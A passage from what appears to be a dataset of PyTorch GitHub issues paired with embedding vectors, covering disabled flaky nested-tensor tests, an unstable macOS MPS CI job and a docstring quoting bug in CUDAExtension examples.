  2.17875808e-01  3.15857604e-02  8.04109350e-02 -6.70313835e-02
  2.06100717e-01 -2.14071810e-01 -9.31257457e-02 -9.99176502e-02
 -1.59471259e-01 -1.60032868e-01 -1.02899551e-01  8.80133063e-02
  2.68259883e-01 -1.45830706e-01 -3.70802641e-01 -8.62793401e-02
  2.43789822e-01 -2.39353001e-01  2.76547611e-01 -6.99403137e-02
 -6.68466985e-02 -1.78924382e-01  9.58757102e-03 -3.36169869e-01
  4.26712707e-02  5.49157895e-02  1.77130282e-01  1.48479342e-01
  1.78287148e-01 -2.29213595e-01  2.80328840e-01  4.21725690e-01
  3.45654711e-02  2.96824038e-01 -1.11021455e-02  5.25707006e-02
 -2.14919612e-01  3.65876138e-01 -1.05552211e-01  2.47852534e-01
  1.46557242e-01 -3.42300594e-01 -3.05055857e-01  6.85513318e-02
  4.06293869e-02 -2.50186995e-02 -3.73641580e-01 -1.63149446e-01
 -2.79549919e-02 -1.44267812e-01 -1.53845355e-01  6.28759935e-02
 -7.38874376e-02  1.12863950e-01  5.92143834e-02 -1.56611707e-02
 -1.87143266e-01  3.22115272e-01 -8.13539401e-02 -1.88064545e-01
 -1.25091150e-01 -2.84108520e-01 -2.31660716e-03 -2.63357460e-01
 -1.14314422e-01 -1.30409569e-01  2.05106631e-01  2.82216012e-01
  3.93972844e-02  6.31568432e-02 -1.27034724e-01 -2.68683955e-02
 -3.11240196e-01 -1.00389883e-01  1.59038305e-01  5.37293315e-01
  1.13970727e-01 -6.29989281e-02  1.45805597e-01  4.53787714e-01
 -3.73458236e-01  1.39957666e-02 -3.64921689e-01 -2.57967979e-01
  1.81487709e-01 -8.64099413e-02  6.53651804e-02 -9.47387069e-02
  2.21900165e-01  3.41552973e-01 -4.13871288e-01  1.49623647e-01
 -2.12419689e-01  2.25576475e-01  1.27763018e-01 -2.14427978e-01
  3.22094679e-01 -3.08603525e-01  3.01037133e-01  8.41358975e-02
 -5.25748581e-02  6.77562207e-02  6.16993606e-02  1.82808369e-01]"
DISABLED test_transpose_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped actionable,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_transpose_cpu_float32&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18328614354).

Over the past 3 hours, it has been determined flaky in 3 workflow(s) with 3 failures and 3 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_transpose_cpu_float32`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer",False,"[-3.41171980e-01 -9.30264592e-04 -2.39240244e-01 -1.78592384e-01
 -2.44958639e-01 -3.72148663e-01 -2.50996221e-02  5.87051362e-02
 -2.73676693e-01 -2.52832323e-01  2.24144638e-01 -1.01520449e-01
  2.49058753e-01  1.23289898e-01 -1.03932597e-01 -1.49545193e-01
 -2.93210566e-01  2.75044888e-02  5.07980108e-01  3.03261857e-02
 -1.65548086e-01 -1.38647482e-02 -2.36099288e-01  1.08660772e-01
  2.14678138e-01 -8.18097312e-03  5.16777113e-02 -8.70478302e-02
  6.50985837e-02  9.66082513e-02  3.13293993e-01  1.37738913e-01
 -1.39219552e-01 -6.46888018e-02  4.51190919e-01  1.69586629e-01
 -3.31739426e-01 -2.00350255e-01 -2.05795079e-01 -2.35058069e-01
  2.82253027e-01  6.68393150e-02 -5.94182424e-02 -2.49851570e-02
  2.04155892e-01  1.86919123e-02 -8.67376328e-02  2.92742074e-01
 -2.31541231e-01  3.01260501e-02  1.96301013e-01 -8.40906352e-02
 -1.15670919e-01 -3.27803880e-01  8.76815990e-04 -2.79081523e-01
  1.21605687e-01  1.88747257e-01  1.32786810e-01  1.90250367e-01
  1.18540622e-01  1.07235730e-01  7.62723014e-03 -9.54233855e-02
 -2.98776291e-02  1.28067553e-01  2.75849879e-01 -3.37001055e-01
  4.22807634e-01 -3.43314484e-02 -3.16796005e-02 -5.18868379e-02
 -2.69197941e-01  5.41111380e-02  7.91853666e-02  1.12222977e-01
 -3.44553709e-01  5.72747886e-02 -9.59465131e-02  2.97370348e-02
 -1.28062248e-01 -3.19561027e-02  1.73012018e-01  1.20905891e-01
  2.08702564e-01  3.73243317e-02  1.30169779e-01  4.32330593e-02
  2.04488873e-01 -1.89204916e-01  1.30892262e-01  3.42469722e-01
 -1.50356025e-01 -2.46190745e-03 -1.21840790e-01 -1.61592841e-01
  2.63253748e-01 -1.08282030e-01 -3.52740943e-01  6.55591413e-02
  1.71140969e-01 -2.10017473e-01 -1.10316902e-01  2.38337219e-01
 -3.23940665e-02 -1.80641174e-01  5.39935231e-01  7.45803639e-02
  1.77428164e-02 -5.89612499e-03 -1.87031683e-02  4.60525565e-02
  8.84459466e-02 -3.20206806e-02 -9.18581337e-02  1.06587578e-02
 -1.80307299e-01 -1.12908110e-01 -2.26522312e-02  4.77782518e-01
 -1.16799243e-01 -1.39584213e-01  1.17935678e-02  7.32236058e-02
  3.16882700e-01 -1.15680415e-02 -2.23803580e-01  9.70835835e-02
  9.49558094e-02 -1.13031611e-01  2.04192206e-01  1.86162263e-01
 -1.37999207e-01 -1.28709257e-01  1.75784186e-01  1.63179338e-01
 -2.96458662e-01 -2.83269256e-01 -2.11816002e-03 -7.51289874e-02
 -1.52133137e-01  2.11493611e-01 -2.07727067e-02 -1.05182640e-01
  2.54480928e-01  1.33281946e-01 -1.57205641e-01  2.08097026e-01
 -3.65682729e-02  2.06017166e-01  9.31881666e-02  6.85036555e-02
  1.13132030e-01  4.22548592e-01 -1.50084466e-01 -4.17934433e-02
  4.73336220e-01  4.30649146e-03  4.29858379e-02 -1.65194064e-01
 -1.23120099e-01  4.26376045e-01 -1.91338472e-02 -4.41675261e-02
  4.08768058e-01 -1.58570260e-01 -3.80486190e-01  7.62267560e-02
 -1.87059343e-02  2.06035212e-01  1.11868665e-01 -1.30377471e-01
  1.14357531e-01 -1.05143607e-01 -4.17017229e-02 -4.65665013e-02
  2.80241996e-01 -2.68745422e-01  1.25209633e-02  2.31524184e-01
  4.55620885e-02 -8.61752778e-05  5.16811088e-02 -7.38801509e-02
 -4.55670729e-02  6.63379282e-02  1.04817882e-01  1.69153679e-02
 -6.82064593e-02 -9.65040773e-02 -4.39749181e-01 -2.48987645e-01
 -9.99423638e-02 -5.41496500e-02 -2.90805519e-01 -2.74440765e-01
  5.54793514e-02  3.47853675e-02  8.69975537e-02  6.51326254e-02
 -1.10783629e-01  1.98012829e-01  2.35577241e-01 -1.14850804e-01
  7.25280046e-02 -1.22306058e-02 -2.17872530e-01 -4.71273094e-01
  2.33267352e-01  8.90205801e-02 -2.04886019e-01 -3.44174862e-01
 -2.13545263e-01 -2.78779745e-01 -1.15165666e-01 -7.83191025e-02
  1.11271657e-01  4.91492338e-02 -9.26274508e-02  1.79381907e-01
 -3.68868411e-01 -1.02983430e-01 -8.59578326e-02 -9.48611125e-02
 -2.78338641e-01 -1.38713941e-01 -2.08028391e-01  2.70537734e-01
 -1.62405878e-01 -3.81002352e-02  1.83311962e-02 -3.06444168e-01
  9.54878479e-02 -7.74948895e-02  1.51432425e-01 -1.52548879e-01
 -1.81687593e-01 -8.29893947e-02 -1.38392851e-01  5.02373040e-01
 -2.66609788e-01 -5.14068365e-01 -1.03798136e-01 -7.73445070e-02
 -6.46612123e-02  1.52024493e-01  2.27283061e-01 -5.01009729e-03
 -1.29972517e-01  7.18878731e-02 -2.07725048e-01 -2.60258377e-01
  4.17508394e-01  4.27350588e-02  1.30438656e-01  3.35298181e-01
 -3.07912510e-02  3.42517346e-02 -8.03345442e-02  5.13404841e-04
 -2.72154026e-02  3.79153728e-01 -1.30317375e-01  3.88566941e-01
  2.80771464e-01 -2.85501964e-02 -2.25776657e-01  1.05938420e-01
  1.92687243e-01 -2.32594788e-01  3.85327101e-01 -3.65994304e-01
  2.41629839e-01  5.62283173e-02  2.77969539e-01 -2.34778881e-01
  4.12527442e-01  1.77707314e-01  9.78501365e-02  6.61425442e-02
  1.65958136e-01  1.13546327e-02 -3.78437042e-02 -9.68658328e-02
  7.74422511e-02 -1.79489344e-01 -3.42555791e-02 -2.68126547e-01
 -1.63467422e-01 -9.96367335e-02 -4.14545983e-02  8.21016431e-02
  1.75771207e-01  1.19295903e-02 -3.87965679e-01 -1.04139179e-01
  2.29797751e-01 -2.84744740e-01  1.28466815e-01 -9.96975452e-02
 -9.15698707e-02 -7.49830604e-02  3.94707248e-02 -3.09015661e-01
  5.49936891e-02 -7.97682554e-02  9.61173028e-02  1.33900672e-01
  2.54343331e-01 -2.42075771e-01  9.19850618e-02  8.77527818e-02
 -8.83342177e-02  2.25375026e-01 -4.19586562e-02  4.04367372e-02
 -2.06398249e-01  2.73907065e-01 -2.37106830e-02  2.36354947e-01
  1.18411139e-01 -1.16120458e-01 -3.32589328e-01  2.88474083e-01
  7.31816515e-04 -9.38512608e-02 -1.29017681e-01 -1.72458068e-02
  2.66967202e-03 -1.23857990e-01 -1.14011295e-01 -1.17251217e-01
 -9.24228877e-02 -4.68252860e-02  7.39536956e-02 -1.01222828e-01
 -1.30915627e-01  4.59411502e-01 -9.79304686e-03 -3.16199332e-01
  4.77721505e-02 -2.48695493e-01 -1.39004029e-02 -3.35539669e-01
 -1.96179807e-01 -7.03194663e-02  3.22491288e-01  3.07727456e-01
  1.60012603e-01  5.89407571e-02 -1.22099243e-01  4.26951796e-03
 -1.67511985e-01 -1.71919852e-01  1.51993101e-02  4.62425053e-01
  1.29677027e-01  5.92604503e-02  3.04355055e-01  4.52584296e-01
 -2.68585265e-01  1.37035102e-02 -3.84970188e-01 -2.98472583e-01
  7.11082742e-02 -1.38167024e-01 -8.85553360e-02  9.06252339e-02
  2.27300733e-01  3.09629798e-01 -3.18018347e-01  1.98101252e-01
 -2.27040052e-01  3.13250303e-01  1.84423611e-01 -1.42291531e-01
  2.54180133e-01 -2.20391423e-01  1.88276440e-01  7.93057010e-02
 -4.65358756e-02  2.40851063e-02  1.26197770e-01  1.91198215e-01]"
UNSTABLE trunk / macos-12-py3-arm64-mps / test (mps) module: ci unstable,"This starts failing in trunk with a missing package, the root cause is unclear, so I reopen this issue to keep trunk sane while investigate https://hud.pytorch.org/pytorch/pytorch/commit/53fff56ab8fead5b8829367730363c13e206975b

cc @seemethere @malfet @pytorch/pytorch-dev-infra",False,"[ 1.07236661e-01  8.99764746e-02  1.47973210e-01  1.00793391e-01
  1.67724982e-01 -5.37856817e-01 -7.28800818e-02  1.47513866e-01
 -3.59075487e-01 -1.32778764e-01 -4.13018186e-03  2.16461167e-01
 -2.65779756e-02  7.82725289e-02 -5.80093622e-01  9.45696384e-02
 -1.79296941e-01 -1.24542847e-01 -1.90670341e-01  2.24369079e-01
 -2.83852518e-01  1.65018141e-01  1.70453750e-02 -3.86837244e-01
 -4.79152173e-01 -1.47210822e-01  1.80190563e-01 -8.07580277e-02
 -4.56008762e-02  2.41129696e-01  2.94920802e-01  1.35298818e-01
  6.56708628e-02 -1.10820040e-01  4.07158434e-01 -2.15570554e-02
  2.97373593e-01 -5.99787354e-01 -2.41641968e-01 -4.92217600e-01
 -2.22076029e-01 -3.54994908e-02 -4.04832810e-02  3.21843624e-01
 -1.58549070e-01  1.68830110e-03  9.07035470e-02 -1.51317701e-01
 -5.58004603e-02  5.11963367e-02  3.12237069e-02  2.37411372e-02
  3.57647628e-01 -3.96241724e-01  2.09330525e-02 -4.41601425e-02
  2.65933909e-02  3.97343129e-01  2.48964965e-01 -6.30448945e-03
  6.27291858e-01 -4.69165146e-02  1.34067863e-01 -2.58803479e-02
  4.99918640e-01  2.94811606e-01  2.41173387e-01 -1.98925152e-01
  1.64524496e-01  2.64596224e-01 -2.94737387e-02  3.68499905e-02
 -3.63186121e-01 -2.59393156e-01  4.44406629e-01 -2.68888641e-02
 -2.11372018e-01 -1.03325292e-01  1.41194463e-02  1.59158677e-01
 -3.09706151e-01  3.52742970e-02 -2.44538337e-01 -3.93167973e-01
 -3.20920169e-01 -7.79502690e-02  4.40405123e-02 -1.65831625e-01
 -2.29182571e-01 -1.81020617e-01  9.46620554e-02 -1.96730286e-01
  1.77502394e-01  1.60019740e-01  1.54004931e-01  3.33701313e-01
  4.10402656e-01  2.76027434e-03 -1.16306044e-01  7.71171898e-02
  1.17477356e-03  3.62757057e-01 -2.32983425e-01  2.52322912e-01
 -3.09395641e-01 -3.51999938e-01  3.07620257e-01  1.48732752e-01
 -1.27524316e-01  2.67922550e-01  3.87070656e-01 -1.74625024e-01
  1.85288891e-01  3.74117881e-01  1.10504813e-01  1.73638135e-01
 -1.50224596e-01  2.32211173e-01 -1.81921422e-01  2.88426101e-01
 -6.58947229e-03 -1.49004370e-01  9.63653997e-02 -7.73090404e-03
  1.95918843e-01 -1.31348237e-01 -3.79960597e-01  4.29820180e-01
 -2.35258594e-01 -2.80458301e-01  1.41909063e-01 -7.17049986e-02
  2.32155979e-01 -1.91820830e-01 -1.41221523e-01  1.87786192e-01
  2.39288360e-01  2.47790664e-03 -1.83500588e-01  2.54380237e-02
 -3.15201223e-01 -1.07649259e-01  2.83628479e-02 -3.49493295e-01
 -4.39943373e-01 -6.10553510e-02 -3.15632939e-01  3.18796225e-02
 -1.48585856e-01 -1.12761624e-01  2.20057428e-01 -4.55075085e-01
  3.21566641e-01  2.89401948e-01  3.78060699e-01  5.16282357e-02
  3.70868921e-01 -5.78429624e-02 -1.60438359e-01 -4.77144755e-02
 -1.81954116e-01  3.34949464e-01 -3.15075517e-01  7.40266591e-02
 -6.03026077e-02  2.38702353e-02 -4.01024640e-01 -1.66078597e-01
 -3.32220793e-02 -8.42506513e-02  1.90878034e-01  4.69414294e-02
  2.80522257e-01 -2.15732962e-01  1.91329911e-01 -3.18276376e-01
 -2.23949164e-01  4.86173481e-02 -1.10166453e-01  2.65168101e-01
  2.57216811e-01 -6.72882125e-02  2.12315060e-02  1.82107598e-01
 -5.72472364e-02  2.35590085e-01 -1.35344282e-01  1.16148658e-01
  2.13595435e-01 -2.34936148e-01  1.49894640e-01 -1.00076944e-01
 -1.77432269e-01 -1.30386442e-01  2.16603994e-01 -1.60186931e-01
  1.07249871e-01  4.16108146e-02  1.45394474e-01 -2.62127463e-02
  1.56793520e-01  1.88980743e-01 -1.55527115e-01 -8.41237307e-02
  2.46490315e-01  1.36846676e-01 -4.21979189e-01 -5.37704945e-01
 -2.66478628e-01 -2.09994912e-01 -4.44543287e-02  2.93315463e-02
 -2.28304833e-01 -1.63586050e-01 -4.48556185e-01  2.01464355e-01
  2.29472950e-01  5.44053018e-02 -1.28468663e-01  7.51675069e-02
 -1.40213192e-01 -2.14345068e-01 -1.56906933e-01 -2.79085279e-01
  4.95263755e-01 -3.84169519e-01 -8.05398375e-02 -2.17373073e-01
 -2.26022556e-01  2.02442020e-01 -2.41487086e-01 -2.64564529e-02
 -5.35719320e-02 -3.01100224e-01  3.45889300e-01  2.80983508e-01
  7.26721957e-02 -1.90311119e-01  3.64208102e-01  3.93378824e-01
 -8.61141980e-02 -1.67198420e-01 -5.97893782e-02  2.00271353e-01
  8.20972472e-02  2.23849401e-01 -2.79747099e-01  1.99106544e-01
 -1.93240836e-01  4.90910411e-02  5.27970493e-02 -2.75474429e-01
 -1.01244822e-01  9.93604772e-05  1.37674227e-01 -1.12710185e-01
 -1.16963968e-01 -1.51878640e-01  5.36134765e-02 -1.97786838e-01
  3.40678066e-01 -7.95487314e-02 -2.63638437e-01  1.79655552e-01
  3.19547236e-01  4.10220712e-01 -4.57613260e-01  1.20908372e-01
  1.18837029e-01 -2.03846499e-01  3.08245420e-01 -6.60477817e-01
  1.03337303e-01  5.28037176e-02  6.24949515e-01 -9.26884264e-02
  5.29008627e-01 -2.74107575e-01  5.24030626e-02  4.47312593e-01
  5.89332618e-02 -1.29755914e-01  4.66399230e-02  2.19432086e-01
  2.44135275e-01  8.85760784e-02  5.67812100e-02 -2.89704680e-01
 -3.14727426e-01 -4.48162198e-01 -4.29809153e-01 -1.20689124e-01
  4.82291669e-01  1.86412185e-01  2.13299960e-01  8.34226906e-02
 -2.11821660e-01  2.49686658e-01  2.84877837e-01 -1.13045774e-01
 -4.27985601e-02 -1.22503959e-01 -2.30087131e-01 -2.22559229e-01
 -4.56331432e-01  2.81345844e-01 -6.11035228e-02  1.89271390e-01
  5.02301395e-01 -3.74021173e-01 -1.34027861e-02  1.72306716e-01
  2.92199664e-02  2.70578682e-01 -5.48294745e-02 -7.51115680e-02
 -6.63066745e-01  4.79404002e-01 -1.76291317e-01  2.70570844e-01
 -6.95083290e-02 -3.90247464e-01 -5.42192638e-01  1.94657505e-01
  4.54862237e-01  1.04139959e-02 -5.12855172e-01  6.19432479e-02
 -1.44725174e-01 -1.62324607e-01  4.78732795e-01 -7.78124332e-02
 -7.90742934e-02 -2.15060599e-02 -1.17246613e-01  4.59076732e-01
 -1.50035471e-01  2.29042992e-01 -4.88815606e-02 -3.69585007e-01
 -2.16197699e-01 -1.27169788e-01  2.26906642e-01  2.31375039e-01
  1.28743857e-01 -5.47052585e-02  5.94530813e-03  1.80178538e-01
 -1.75361931e-01 -3.38636637e-01 -2.02877045e-01  3.67361635e-01
 -1.15438685e-01 -2.35706996e-02 -1.70848966e-02  6.29663348e-01
  4.77779537e-01  3.27534556e-01 -1.37655623e-02  1.89306185e-01
 -1.87272936e-01 -2.05622837e-01 -3.45748007e-01 -9.62896645e-02
 -2.58432359e-01  4.53475192e-02 -2.44036287e-01  5.03139019e-01
 -1.26803875e-01  1.21075939e-03 -9.61133465e-02  1.24958735e-02
  1.20932713e-01  5.12166470e-02  1.87429860e-01 -1.99740589e-01
 -1.01793231e-03  2.36787185e-01 -8.03370960e-03  3.29502046e-01
  2.61623710e-01  2.18800351e-01 -2.42265854e-02  1.28192827e-01]"
C++ Extension example has incorrect quoting module: cpp-extensions triaged topic: docs,"### ðŸ“š The doc issue

The current docstring for [`torch.utils.cpp_extension.CUDAExtension`](https://pytorch.org/docs/stable/cpp_extension.html#torch.utils.cpp_extension.CUDAExtension) includes two examples of invoking it which are formatted incorrectly and aren't copy-pastable as written.

### Suggest a potential alternative/fix

_No response_

cc @malfet @zou3519",False,"[-0.43523118 -0.0463255  -0.0651785  -0.04655845  0.07576916  0.02067419
 -0.136456   -0.08327304 -0.18517254 -0.1417926   0.01741407  0.21411592
  0.06439143  0.22281097  0.06803738  0.16862836 -0.35868722  0.43517712
  0.1128522  -0.05299165 -0.06106463  0.44908884 -0.18786147 -0.06479314
  0.02245959  0.11497286 -0.32060346 -0.3940999   0.17191458 -0.10049117
  0.34050095  0.08756813 -0.47730964  0.0922256   0.26961422  0.08104776
 -0.30775082  0.21092641 -0.00089288 -0.15977797 -0.0407429   0.01821535
 -0.10681486 -0.04197112 -0.3072284  -0.30371398 -0.21987125  0.11567791
 -0.16078931  0.09043813 -0.03696952 -0.02578979 -0.35661262  0.10265066
  0.07862385 -0.13578646 -0.11485711  0.16576104  0.16056722 -0.18302414
  0.13193636  0.23011945 -0.06942689  0.10227761 -0.21562886 -0.03660061
 -0.04924254  0.45837379  0.4357693   0.17743677 -0.12742078  0.29887336
 -0.18998238 -0.11151886  0.08136107 -0.00860019 -0.41247913  0.3512377
 -0.1192795  -0.27411765  0.1919074  -0.01478552 -0.14975403  0.02136812
  0.0074176  -0.12576121  0.15923081 -0.22533467  0.40826923  0.09206825
  0.00205129 -0.1384344   0.2610098   0.1545478   0.1439538  -0.00357907
  0.01989814  0.21316595 -0.04301725 -0.30048266 -0.04777187 -0.25508797
  0.02882014  0.06738669  0.1280277  -0.36500835  0.08129976  0.02058044
  0.11725439 -0.19215652  0.08951143  0.03903487  0.10641811 -0.38983315
 -0.17619252  0.12773445 -0.1262612  -0.30307743 -0.23469758  0.0490049
  0.3037784   0.11371356 -0.26235288  0.19397567  0.04968652  0.19399182
 -0.24381247 -0.06971547  0.11245143 -0.01427869 -0.00888006  0.06835113
  0.26289052  0.07290962  0.20995346  0.23319794 -0.5039449  -0.27873898
 -0.06515528 -0.01220583 -0.0080037  -0.11104105 -0.21047935 -0.3302517
  0.19554812  0.29737344 -0.16203746 -0.04403196 -0.11270084  0.15981798
 -0.10443518  0.09659763 -0.37180123  0.44760048  0.17062862 -0.14890988
  0.47795486 -0.05175689  0.0979596  -0.3230399   0.09905042  0.402575
  0.14524946  0.2319789   0.1433644  -0.07047137 -0.08740337  0.0420823
 -0.21525663  0.06887691 -0.2231155  -0.0389368   0.08851862 -0.1943652
  0.06625988 -0.16669077 -0.21167968 -0.29122978  0.17129909  0.3947732
  0.22351179  0.44156313  0.04794667  0.01569761 -0.31738433  0.12063546
  0.2313213  -0.08557675  0.15631595  0.18089095 -0.41302145 -0.26884034
 -0.07531823 -0.11593851  0.00724788  0.29687455  0.22442237  0.23661056
 -0.08826725  0.25364357 -0.26188666 -0.00667659  0.11164726 -0.10038666
  0.17635632  0.20222041 -0.11675162 -0.4935794  -0.34596097  0.00399948
 -0.06909925  0.18671799 -0.04720812 -0.40811014 -0.10300769  0.4356364
 -0.13673326  0.12686583  0.17982157  0.07604422  0.08948676 -0.05980862
  0.23928809 -0.08375144  0.13139117  0.14011388 -0.30012563  0.08765055
 -0.23179317  0.07187291 -0.14561406 -0.2637871   0.29486957 -0.22543243
 -0.15025404  0.1873439   0.06872997 -0.14020555 -0.277588   -0.04852788
 -0.28793168 -0.03195233 -0.1801756  -0.00931536 -0.03928465 -0.11515476
  0.08782495  0.16172504 -0.10903553 -0.05384936 -0.08372668 -0.3298191
  0.26351714  0.07557862  0.33530927  0.13308164 -0.16087548 -0.07690136
 -0.3280071  -0.11892309 -0.0126899   0.44663846  0.0808349   0.1751707
  0.15098926 -0.09985985  0.16412134  0.06197183 -0.03970088 -0.07846802
  0.11020613 -0.11127805  0.4751833  -0.02023163  0.14756724 -0.13731773
  0.06569774 -0.33836463  0.1466262  -0.19665238 -0.024074    0.06374744
 -0.23997918  0.14468582  0.0776209  -0.08170038 -0.06624529 -0.25697058
 -0.08593154 -0.02479174 -0.20996681 -0.09508483  0.09093633 -0.15853865
 -0.06613103  0.05576946 -0.08010635 -0.22323613  0.22100651  0.10727261
 -0.07553216 -0.09800416 -0.00058145  0.06065996 -0.04199559  0.00648161
 -0.01533271 -0.06081217  0.244607   -0.17041269  0.05400834  0.27008447
 -0.39846975  0.2238626  -0.1524266   0.02415222 -0.23191997  0.39411744
  0.03967925  0.31006998 -0.22976202 -0.13539544 -0.44598794 -0.15853114
 -0.01188224  0.01798069 -0.10688785  0.25361696 -0.00394912 -0.12971786
 -0.01025087  0.1100447   0.18200147 -0.00768915 -0.44206166 -0.09347825
  0.13065365 -0.07683781 -0.03272765 -0.11920553 -0.259204    0.08490264
 -0.04393114 -0.09740721 -0.21745998 -0.42625484  0.10776038  0.34244084
 -0.0211589  -0.21413235  0.16767204  0.12392923 -0.16358767  0.073133
  0.11439022  0.30829668  0.13257611 -0.02634602  0.07924949  0.3472129
  0.11525816  0.1327137  -0.06002813 -0.02623246 -0.16326335 -0.06652202
  0.15084317 -0.11451644  0.12586518  0.25438213 -0.2987988  -0.00075153
  0.00281127  0.24489723  0.41761363  0.04252077  0.3752399  -0.01569876
  0.2641446  -0.03650011 -0.16439351  0.03297701  0.40108553  0.21755406]"
DISABLED test_layer_norm_backward_size_128_cpu (__main__.TestNestedTensorAutogradCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_layer_norm_backward_size_128_cpu&suite=TestNestedTensorAutogradCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18292362537).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_layer_norm_backward_size_128_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-2.17089713e-01  6.30230159e-02 -8.54776129e-02 -4.40783575e-02
 -1.58534050e-01 -3.27425480e-01 -1.08535357e-01  2.58024335e-01
 -4.77566451e-01 -9.98134464e-02  3.14014137e-01 -1.32442176e-01
  3.84971142e-01  8.08256567e-02 -2.07884043e-01  1.13369776e-02
 -1.89749449e-01 -9.72796232e-02  4.22916323e-01  1.25700086e-01
 -1.71462417e-01 -4.86523286e-03 -2.00171039e-01  2.58554220e-01
  2.12231144e-01 -5.94277717e-02 -2.14041546e-01 -1.94119439e-02
  1.48534387e-01  5.58521748e-02  7.30244368e-02  1.46607906e-01
 -2.73061782e-01  2.49739960e-02  5.14645934e-01  1.48182154e-01
 -3.59605849e-02 -1.56872123e-01 -3.41608554e-01 -2.95966584e-03
  1.85004234e-01  9.82913375e-02 -5.93735091e-02 -6.69862479e-02
  1.92135513e-01  3.71218771e-02 -1.16370335e-01  2.57843614e-01
 -3.14903975e-01 -2.71281272e-01  2.91492045e-01 -3.92845683e-02
 -2.07871571e-03 -3.27224821e-01  2.37470213e-02 -2.93580770e-01
  1.05155483e-01  3.30028296e-01  1.26160711e-01  3.19136381e-01
  1.90715194e-01 -1.31888390e-02 -8.65647793e-02 -1.35029688e-01
 -3.43739241e-02  8.42128843e-02  2.24493161e-01 -1.97121620e-01
  3.06743115e-01  3.55648063e-02  1.47274375e-01 -2.76574716e-02
 -3.68541449e-01 -2.61059031e-02  2.37783819e-01  1.59273118e-01
 -2.59267151e-01  8.13412741e-02 -1.15441896e-01 -9.54598486e-02
 -1.50820881e-01  1.06769383e-01  3.47187892e-02  5.02356812e-02
  8.70175660e-02 -4.66412604e-02  1.42629206e-01 -2.21323855e-02
  4.79770713e-02 -2.86066383e-01  3.17295611e-01  1.70779988e-01
 -3.37887973e-01  4.69888076e-02 -9.42216665e-02 -1.28632545e-01
  2.67639399e-01 -1.43363446e-01 -2.72593558e-01  1.69904664e-01
  1.84772283e-01 -3.31826806e-01 -1.31805807e-01  3.53049725e-01
 -2.35864773e-01 -2.54363984e-01  4.33596045e-01  1.80137753e-01
 -5.96388057e-02 -7.64095485e-02  1.84398443e-01  4.71194945e-02
 -7.32909217e-02  1.00084648e-01  1.09569386e-01 -1.26271069e-01
 -2.17108846e-01 -1.66988283e-01  4.08787094e-02  5.00633061e-01
 -2.37743989e-01 -8.75942260e-02  1.20820850e-01 -1.05360918e-01
  2.70637631e-01 -2.28559002e-02 -3.35778743e-02  6.19898085e-03
  1.72899917e-01  1.18034065e-01  8.54774266e-02  2.09410638e-01
 -1.13710016e-01 -6.10705204e-02  6.99187741e-02  1.28264755e-01
 -7.89561793e-02 -1.71763748e-01  1.16087738e-02  1.57251194e-01
 -3.27561796e-01  2.25664750e-01  8.34444389e-02 -2.04606235e-01
  3.47074866e-01  4.34253514e-02 -3.12837750e-01  9.39904600e-02
 -3.59543227e-02  8.45928192e-02  9.87276286e-02  4.32257503e-02
  3.37349355e-01  1.58869490e-01  1.19735233e-01 -5.60969301e-02
  2.12266713e-01  5.98224550e-02  1.41229510e-01 -1.33432120e-01
  4.39593084e-02  3.15349162e-01 -1.82389915e-01  5.57200909e-02
  2.52178669e-01 -5.82484081e-02 -4.87838030e-01 -8.20665434e-02
  8.72071385e-02  1.62342936e-01  7.96478465e-02 -2.83179320e-02
  2.31312260e-01  2.15988234e-02  1.42620504e-01 -3.08188796e-01
  1.47977859e-01 -3.76633555e-01 -9.41603631e-02  2.26764590e-01
  7.23481774e-02 -3.53359245e-02  2.42421716e-01  1.31574214e-01
  1.24103548e-02  1.30751610e-01  2.45012000e-01 -2.51615532e-02
  5.54559529e-02 -7.10484684e-02 -5.75911760e-01 -1.94517732e-01
  2.21150666e-02  2.85845958e-02 -2.07904011e-01 -3.44251275e-01
 -1.57486051e-02 -5.37882708e-02 -7.23432004e-02  2.58463323e-02
 -2.48421252e-01  3.69873226e-01  2.15103537e-01  5.39473183e-02
  1.20104291e-02  1.38520703e-01 -2.60547429e-01 -3.84645075e-01
 -4.00073752e-02  1.33116484e-01 -2.54653335e-01 -4.76762056e-02
 -2.40114257e-02 -4.00042415e-01  7.65515305e-03  1.62370995e-01
  6.13387823e-02 -7.18454719e-02 -3.62346023e-02  2.17755526e-01
 -2.49438584e-01 -7.91150331e-02 -3.09890240e-01 -1.41016752e-01
 -3.81355494e-01 -8.36725533e-02 -2.21459597e-01  3.31693649e-01
  6.08520117e-03  1.53744575e-02 -1.90993428e-01 -7.65788704e-02
  2.40864903e-02 -4.78377379e-02  4.35399652e-01 -3.07551175e-01
 -1.95597917e-01 -1.02724031e-01  8.67483616e-02  5.17324686e-01
 -5.39210081e-01 -5.43366373e-01 -1.03929088e-01  5.93045950e-02
  5.99076319e-03  1.39921188e-01  8.68426114e-02 -1.43086389e-01
 -1.33052960e-01  1.00846961e-01 -3.46929073e-01 -2.17137873e-01
  1.65802062e-01 -6.38577119e-02  6.23764247e-02  3.14315826e-01
